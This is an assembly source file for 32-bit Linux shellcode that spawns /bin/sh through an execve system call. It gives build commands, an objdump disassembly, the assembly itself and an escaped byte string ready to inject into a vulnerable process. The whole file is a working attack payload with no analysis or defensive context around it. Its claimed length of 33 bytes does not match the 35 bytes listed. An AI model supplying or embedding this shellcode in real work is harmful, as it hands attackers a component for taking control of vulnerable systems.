; compilation
; $ nasm -f elf32 execve.s -o a && objdump -d -Mintel a
;
;31 d2           xor    edx,edx
;31 c0           xor    eax,eax
;89 14 24        mov    DWORD PTR [esp],edx
;68 2f 2f 73 68  push   0x68732f2f
;68 2f 62 69 6e  push   0x6e69622f
;89 e3           mov    ebx,esp
;6a ff           push   0xffffffff
;89 14 24        mov    DWORD PTR [esp],edx
;6a ff           push   0xffffffff
;89 1c 24        mov    DWORD PTR [esp],ebx
;89 e1           mov    ecx,esp
;b0 0b           mov    al,0xb
;cd 80           int    0x80
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

xor		edx,edx
xor		eax,eax
mov		[esp],edx
push	0x68732f2f
push	0x6e69622f
mov		ebx,esp
push	0xffffffff
mov		[esp],edx
push	0xffffffff
mov		[esp], ebx
mov		ecx,esp
mov		al,0xb
int		0x80

;\x31\xd2\x31\xc0\x89\x14\x24\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\xff\x89\x14\x24\x6a\xff\x89\x1c\x24\x89\xe1\xb0\x0b\xcd\x80 (33 bytes)
